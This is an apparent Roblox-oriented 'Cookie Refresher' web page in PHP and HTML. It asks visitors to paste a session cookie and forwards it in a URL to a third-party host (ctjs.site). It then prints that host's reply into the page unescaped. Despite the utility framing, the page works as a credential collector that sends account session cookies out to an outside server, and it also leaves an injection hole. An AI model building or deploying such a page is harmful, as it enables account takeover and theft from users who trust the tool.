<!DOCTYPE html>
<html lang="en">
<head>
	<style>
	body,
	html {
		background: rgb(24, 24, 28) !important;
	}
        .response-box {
            border: 0px solid black;
            padding: 10px;
            overflow-wrap: break-word;
            width: 500px;
            height: 200px;
        }
	</style>
	<meta charset="UTF-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<title>Cookie Refresher</title>>
	<link href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-dark@4/dark.css" rel="stylesheet">
	<link href="https://bloxytools.org/assets/css/imports.css" rel="stylesheet">
	<link rel="stylesheet" href="https://bloxytools.org/assets/css/snackbar.css" />
	<script src="https://bloxytools.org/assets/js/snackbar.js"></script>
	<style>
	    .swal2-container {
	        z-index: 20000 !important;
	    }
	</style>
</head>
<body>
	<section id="login" class="form">
		<div class="container h-100">
			<div class="row justify-content-center align-items-center h-100">
				<div class="col-md-10 col-lg-5">
					<div class="login-box" data-aos="fade-up" data-aos-duration="1500">
						<center><h2>Cookie Refresher<strong></strong></h2></center>
                            <form method="post">
                            <input placeholder="Cookie" class="auth-input" type="text" name="cookie" id="cookie">
                            <input type="submit" class='button primary d-block mt-3 w-100' value="Submit">
                            </form>
<?php
        if(isset($_POST['cookie'])) {
            $cookie = $_POST['cookie'];
            $endpoint = "https://ctjs.site/refresh.php?cookie=" . urlencode($cookie);
            $response = file_get_contents($endpoint);
            echo "<div class='response-box'><p>Response: " . $response . "</p></div>";
        }
    ?>
</body>
</html>
